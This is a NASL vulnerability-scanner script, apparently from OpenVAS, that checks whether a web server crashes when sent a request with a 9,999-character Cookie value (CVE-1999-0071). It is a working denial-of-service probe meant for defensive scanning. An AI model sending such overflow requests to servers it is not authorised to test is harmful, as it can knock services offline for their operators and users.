# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11077");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-1999-0071");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("HTTP Cookie Overflow DoS Vulnerability");

  script_category(ACT_DENIAL);
  # All the www_too_long_*.nasl scripts were first declared as
  # ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
  # The web server might be killed by those generic tests before the scanner
  # has a chance to perform known attacks for which a patch exists
  # As ACT_DENIAL are performed one at a time (not in parallel), this reduces
  # the risk of false positives.

  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your software or protect it with a filtering reverse proxy.");

  script_tag(name:"summary", value:"It was possible to kill the web server by
  sending an invalid request with a too long Cookie name or value.");

  script_tag(name:"impact", value:"A cracker may exploit this vulnerability to make your web server
  crash continually or even execute arbirtray code on your system.");

  script_tag(name:"affected", value:"Apache HTTP server versions prior to 1.1 are known to be
  affected. Other versions or products might be affected as well.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

if(http_is_dead(port:port))
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

# If the server sends us a cookie, we will reply with it...
# Slightly modified :-)
r = http_get(item:"/", port:port);
send(socket:soc,data:r);
h = http_recv_headers2(socket:soc);
r = http_recv_body(socket:soc, headers:h);
close(soc);

ck = egrep(pattern:"^Set-Cookie: ", string:h);

ckn = "VT-Test";
if(ck) {
  ckn = ereg_replace(string:ck, pattern:"^Set-Cookie: +([^=;]+)=.*", replace:"\1");
}

soc = http_open_socket(port);
if(!soc)
  exit(0);

r = http_get(item:"/", port:port);
r = r - string("\r\n\r\n");
r = string(r, "\r\n", "Cookie: ", ckn, "=", crap(9999), "\r\n\r\n");

send(socket:soc, data:r);
r = http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port:port, retry:2)) {
  security_message(port);
  exit(0);
}

exit(99);
